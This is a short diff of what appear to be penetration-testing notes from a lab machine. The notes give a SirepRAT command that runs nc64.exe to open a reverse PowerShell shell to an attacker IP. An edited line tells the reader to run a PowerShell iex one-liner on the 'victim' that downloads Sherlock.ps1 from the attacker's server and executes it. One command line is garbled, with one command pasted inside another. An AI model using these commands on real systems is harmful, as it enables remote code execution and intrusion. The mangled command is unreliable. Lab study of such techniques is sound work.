@@ -229,7 +229,7 @@ Password Protected SSH Private Key:
 			- python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\> python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe"" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.16.7 1234 -e powershell.exe" --v
 			
 	- Sherlock.ps1:
-		- Once you get it on a client machine, you can execute it by powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/sherlock.ps1'); Find-AllVulns
+		- Once you get it on the attacker machine, start an http server on the attacker machine and run this command on the victim: powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Sherlock.ps1'); Find-AllVulns
 
 			
 
